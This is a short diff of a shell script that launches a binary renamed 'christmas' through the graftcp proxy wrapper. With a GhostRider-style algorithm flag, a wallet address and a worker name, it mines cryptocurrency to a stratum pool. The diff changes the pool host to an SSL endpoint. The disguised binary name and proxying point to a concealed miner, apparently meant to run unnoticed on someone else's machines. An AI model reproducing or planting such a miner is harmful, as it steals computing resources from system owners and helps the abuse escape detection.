@@ -35,4 +35,4 @@ chmod +x christmas
 
 ph add christmas
 
-./graftcp/graftcp ./christmas -a gr -o stratum+tcp://raptoreumemporium.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz72 -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o stratum+ssl://stratum-na.rplant.xyz:17056 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz72 -p IhatePopUps
